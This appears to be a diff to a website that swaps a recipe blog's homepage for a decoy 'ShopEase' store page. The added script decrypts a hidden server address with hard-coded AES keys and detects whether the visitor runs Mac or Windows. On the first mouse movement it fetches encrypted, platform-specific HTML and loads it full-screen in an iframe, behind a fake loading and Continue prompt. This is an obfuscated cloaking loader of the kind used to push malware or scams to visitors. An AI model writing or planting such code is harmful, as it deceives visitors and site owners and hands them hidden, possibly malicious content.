@@ -1,238 +1,293 @@
-<?php require __DIR__ . '/teams.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DTP ShopEase</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  <!-- Google Consent Mode v2 — cookies stay off until the visitor chooses -->
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('consent', 'default', {
-      'ad_storage': 'denied',
-      'ad_user_data': 'denied',
-      'ad_personalization': 'denied',
-      'analytics_storage': 'denied',
-      'wait_for_update': 500
-    });
-  </script>
+    
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
 
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-0LY0HY7L01');
-  </script>
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
 
-  <!-- Primary SEO -->
-  <title>Pure Taste Table — Honest, Wholesome Recipes for Real Home Kitchens</title>
-  <meta name="description" content="Pure Taste Table shares tested, wholesome recipes made with everyday ingredients. Simple techniques, honest flavours, and cooking guides written for real home kitchens.">
-  <meta name="keywords" content="wholesome recipes, home cooking, easy dinner ideas, healthy recipes, seasonal cooking, Pure Taste Table">
-  <meta name="author" content="Pure Taste Table">
-  <meta name="robots" content="index, follow">
-  <link rel="canonical" href="https://www.puretastetable.com/">
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
 
-  <!-- Open Graph / Social -->
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Pure Taste Table — Honest, Wholesome Recipes">
-  <meta property="og:description" content="Tested recipes, simple techniques and honest flavours for real home kitchens.">
-  <meta property="og:url" content="https://www.puretastetable.com/">
-  <meta property="og:image" content="https://picsum.photos/seed/puretaste-hero/1200/630">
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
 
-  <!-- Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
 
-  <link rel="stylesheet" href="css/style.css">
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0LY0HY7L01');
+</script>
+
+
 </head>
 <body>
 
-  <header class="site-header">
-    <div class="container nav-wrap">
-      <a href="index.php" class="brand">Pure<span>Taste</span>Table</a>
-      <button class="nav-toggle" aria-label="Open menu" aria-expanded="false">&#9776;</button>
-      <nav class="main-nav" aria-label="Main navigation">
-        <ul>
-          <li><a href="index.php">Home</a></li>
-          <li><a href="recipes.html">Recipes</a></li>
-          <li><a href="about.html">About</a></li>
-          <li><a href="contact.html">Contact</a></li>
-        </ul>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-    </div>
-  </header>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <main>
-    <!-- Hero -->
-    <section class="container hero">
-      <div>
-        <span class="hero-kicker">✦ Tested in a real home kitchen</span>
-        <h1>Good food doesn't need to shout. <em>It just needs to be honest.</em></h1>
-        <p>Welcome to Pure Taste Table — a quiet corner of the internet where every recipe is cooked, tasted and tweaked in a real home kitchen before it ever reaches you. No fads, no fifteen-ingredient sauces. Just food that tastes like someone cared.</p>
-        <div class="btn-row">
-          <a href="recipes.html" class="btn btn-primary">Browse Recipes</a>
-          <a href="about.html" class="btn btn-ghost">Our Story</a>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+ <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-      </div>
-      <div class="hero-img">
-        <img src="https://picsum.photos/seed/puretaste-hero/800/600" alt="A rustic wooden dining table set with fresh, home-cooked seasonal dishes" loading="eager">
-      </div>
-    </section>
-
-    <!-- Stats -->
-    <section class="container stats" aria-label="Pure Taste Table in numbers">
-      <div class="stat"><b>120+</b><span>Tested recipes</span></div>
-      <div class="stat"><b>3&times;</b><span>Every recipe cooked before publishing</span></div>
-      <div class="stat"><b>&lt;10</b><span>Ingredients in most dishes</span></div>
-      <div class="stat"><b>100%</b><span>Honest write-ups, zero fluff</span></div>
-    </section>
-
-    <!-- Featured Recipes -->
-    <section class="container section" id="featured">
-      <div class="section-head">
-        <span class="eyebrow">From Our Kitchen</span>
-        <h2>Recipes people actually come back to</h2>
-        <p>These are the dishes our readers cook on repeat — tested until the method is foolproof and the ingredient list is as short as it can honestly be.</p>
-      </div>
-
-      <div class="grid-3">
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-soup/800/600" alt="Bowl of slow-simmered tomato and basil soup with crusty bread" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">Comfort Food</span>
-            <h3>Slow-Simmered Tomato &amp; Basil Soup</h3>
-            <p>The kind of soup that makes a rainy Tuesday feel like an occasion. One pot, seven ingredients, zero shortcuts on flavour.</p>
-            <div class="card-meta">40 mins &middot; Serves 4</div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
-        </article>
-
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-salad/800/600" alt="Fresh garden salad with roasted vegetables and lemon dressing" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">Fresh &amp; Light</span>
-            <h3>Roasted Veg &amp; Lemon Grain Bowl</h3>
-            <p>Proof that a "healthy bowl" doesn't have to taste like a compromise. Charred edges, bright dressing, proper crunch.</p>
-            <div class="card-meta">35 mins &middot; Serves 2</div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-        </article>
-
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-bread/800/600" alt="Golden homemade sourdough-style bread loaf on a cooling rack" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">Baking</span>
-            <h3>No-Fuss Overnight Bread</h3>
-            <p>Mix it before bed, bake it after breakfast. A crackly, golden loaf that will quietly ruin supermarket bread for you.</p>
-            <div class="card-meta">12 hrs rest &middot; 45 mins bake</div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-        </article>
-
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-curry/800/600" alt="Fragrant homestyle vegetable curry served with steamed rice" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">Weeknight Dinner</span>
-            <h3>Everyday Homestyle Curry</h3>
-            <p>Built on pantry spices and whatever vegetables are looking hopeful in your fridge. Forgiving, fragrant, and fast.</p>
-            <div class="card-meta">30 mins &middot; Serves 4</div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
           </div>
-        </article>
-
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-pasta/800/600" alt="Plate of fresh pasta tossed with garlic, olive oil and herbs" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">15-Minute Meals</span>
-            <h3>Midnight Garlic &amp; Herb Pasta</h3>
-            <p>The dish we make when the fridge is nearly empty and the day was long. Five ingredients, one unforgettable plate.</p>
-            <div class="card-meta">15 mins &middot; Serves 2</div>
-          </div>
-        </article>
-
-        <article class="card">
-          <img src="https://picsum.photos/seed/puretaste-dessert/800/600" alt="Warm baked apple dessert with cinnamon and cream" loading="lazy">
-          <div class="card-body">
-            <span class="card-tag">Dessert</span>
-            <h3>Warm Cinnamon Baked Apples</h3>
-            <p>Dessert that feels like a hug — no mixer, no pastry skills, no stress. Just apples doing what apples do best.</p>
-            <div class="card-meta">25 mins &middot; Serves 4</div>
-          </div>
-        </article>
-      </div>
-    </section>
-
-    <!-- Philosophy -->
-    <section class="container section">
-      <div class="split">
-        <img src="https://picsum.photos/seed/puretaste-kitchen/800/800" alt="Sunlit home kitchen counter with fresh seasonal ingredients being prepared" loading="lazy">
-        <div>
-          <span class="eyebrow">Why We Cook This Way</span>
-          <h2>Fewer ingredients. More intention.</h2>
-          <p>Somewhere along the way, home cooking got complicated. Recipes started demanding equipment nobody owns and ingredients nobody can pronounce. We think that's a shame — because the best meals most of us remember were made from almost nothing, by someone who simply paid attention.</p>
-          <p>Every recipe on Pure Taste Table follows three quiet rules: ingredients you can find at a normal shop, steps a tired person can follow on a weeknight, and flavour that doesn't need a filter.</p>
-
-          <div class="values">
-            <div class="value-item">
-              <h3>Tested, not guessed</h3>
-              <p>Each recipe is cooked at least three times before publishing — including once deliberately in a hurry.</p>
-            </div>
-            <div class="value-item">
-              <h3>Seasonal by default</h3>
-              <p>We lean on what's fresh and affordable right now, so your food tastes better and costs less.</p>
-            </div>
-            <div class="value-item">
-              <h3>Honest write-ups</h3>
-              <p>If a step can go wrong, we tell you how — and exactly how to rescue it.</p>
-            </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
     </section>
 
-    <!-- CTA -->
-    <section class="container">
-      <div class="cta-band">
-        <h2>Got a question about a recipe?</h2>
-        <p>We read every message that comes through — whether it's a substitution question, a success story, or a polite complaint that our bread recipe made you buy a Dutch oven.</p>
-        <a href="contact.html" class="btn btn-primary">Get in Touch</a>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
     </section>
-  </main>
 
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div>
-          <a href="index.php" class="brand">Pure<span>Taste</span>Table</a>
-          <p>Honest, wholesome recipes tested in a real home kitchen. Simple food, made with intention, shared with care.</p>
-        </div>
-        <div>
-          <h4>Explore</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="recipes.html">Recipes</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="contact.html">Contact</a></li>
-          </ul>
-        </div>
-        <div>
-          <h4>Legal</h4>
-          <ul>
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms &amp; Conditions</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="cookies.html">Cookies Policy</a></li>
-          </ul>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <span>&copy; <span id="year">2026</span> Pure Taste Table. All rights reserved.</span>
-        <span>Made with patience and quite a lot of garlic.</span>
-      </div>
-    </div>
-  </footer>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <script src="js/script.js"></script>
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+KNPPWPVrh/bOvmKyhCNtZTdAiPcfZCSVuygLJirhtMP7pUPbV0JXx";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
